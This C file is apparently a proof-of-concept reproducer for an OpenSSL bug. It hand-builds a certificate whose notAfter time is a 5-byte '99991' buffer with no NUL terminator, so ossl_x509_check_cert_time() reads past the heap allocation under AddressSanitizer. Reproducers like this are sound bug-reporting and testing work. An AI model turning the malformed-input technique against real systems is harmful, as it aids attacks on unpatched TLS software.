/*
 * PoC for GH-28962: heap-buffer-overflow (OOB read) in
 * ossl_x509_check_cert_time() due to strcmp() on a non-NUL-terminated
 * ASN1_STRING buffer for the notAfter field.
 *
 * We build an X509 whose notAfter field is a crafted, exactly-sized
 * (non-NUL-terminated) buffer that is a byte-for-byte prefix of the
 * magic string "99991231235959Z" used by ossl_x509_check_cert_time().
 * strcmp() will walk past the end of the heap allocation looking for
 * a NUL terminator / mismatch, triggering an ASan heap-buffer-overflow
 * READ on vulnerable revisions.
 */
#include <openssl/x509.h>
#include <openssl/x509v3.h>
#include <openssl/asn1.h>
#include <openssl/err.h>
#include <string.h>
#include <stdio.h>

#include "x509_local.h"

int main(void)
{
    X509 *x = X509_new();
    X509_STORE *store = X509_STORE_new();
    X509_STORE_CTX *ctx = X509_STORE_CTX_new();

    if (x == NULL || store == NULL || ctx == NULL) {
        fprintf(stderr, "alloc failure\n");
        return 2;
    }

    if (!X509_STORE_CTX_init(ctx, store, x, NULL)) {
        fprintf(stderr, "ctx init failure\n");
        return 2;
    }

    /* notBefore: a well-formed time well in the past */
    X509_gmtime_adj(X509_getm_notBefore(x), -3600);

    /*
     * notAfter: a crafted ASN1_STRING whose data buffer is EXACTLY
     * 5 bytes, containing "99991" (a byte-for-byte prefix of the
     * magic "99991231235959Z"), and NOT NUL terminated. The buffer
     * is allocated with OPENSSL_malloc(5) so nothing but the 5
     * requested bytes belongs to this heap object.
     */
    {
        ASN1_TIME *notafter = X509_getm_notAfter(x);
        unsigned char *buf = OPENSSL_malloc(5);

        memcpy(buf, "99991", 5);
        /* Takes ownership of buf, frees old data, sets length = 5 */
        ASN1_STRING_set0(notafter, buf, 5);
        /* Keep whatever ASN1 time-string type it already had. */
    }

    printf("Calling ossl_x509_check_cert_time...\n");
    fflush(stdout);

    /* depth < 0 => no verify callback path, just a status return */
    int ret = ossl_x509_check_cert_time(ctx, x, -1);

    printf("ossl_x509_check_cert_time returned %d\n", ret);

    X509_STORE_CTX_free(ctx);
    X509_STORE_free(store);
    X509_free(x);

    printf("DONE_NO_CRASH\n");
    return 0;
}
